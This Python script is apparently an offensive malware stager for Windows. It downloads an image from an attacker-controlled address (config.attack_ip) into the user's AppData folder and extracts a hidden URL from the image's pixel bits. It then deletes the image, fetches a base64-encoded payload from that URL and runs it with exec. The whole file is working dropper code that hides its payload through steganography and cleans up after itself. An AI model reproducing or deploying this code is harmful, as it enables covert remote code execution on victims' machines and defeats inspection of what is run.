import cv2
import numpy as np
import requests
import os
from base64 import b64decode
import config

user = os.getlogin()
# get the current login user
res = requests.get(f"http://{config.attack_ip}/dl/image", allow_redirects=True)

open(f"C:\\Users\\{user}\\AppData\\Local\\image.png", 'wb').write(res.content)

def to_bin(data):
    ''' convert 'data' to binary foramt as string
    
    '''
    if isinstance(data, str):
        # 08b --- 
        return ''.join([ format(ord(i), "08b") for i in data])
    elif isinstance(data, bytes):
        return ''.join( format(i, "08b") for i in data)
    elif isinstance(data, np.ndarray):
        return [ format(i, "08b") for i in data]
    elif isinstance(data, int) or isinstance(data, np.unit8):
        return format(data, "08b")
    else:
        raise TypeError("Type not supported")


def decode(image_name):
    image = cv2.imread(image_name)
    binary_data = ""
    for row in image:
        for pixel in row:
            r, g, b = to_bin(pixel)
            binary_data += r[-1]
            binary_data += g[-1]
            binary_data += b[-1]
    
    # split by 8-bits
    all_bytes = [binary_data[i: i+8] for i in range(0, len(binary_data), 8)]
    # convert from bits to characters
    decoded_data = ""
    for byte in all_bytes:
        decoded_data += chr(int(byte, 2))
        if decoded_data[-5:] == "====":
            break
    
    return decoded_data[:-5]


output_image = f"C:\\Users\\{user}\\AppData\\Local\\image.png"

decoded_data = decode(output_image)

try:
    os.remove(f"C:\\Users\\{user}\\AppData\\Local\\image.png")
except:
    pass

r = requests.get(decoded_data)
e = b64decode(r.text).decode()

exec(e)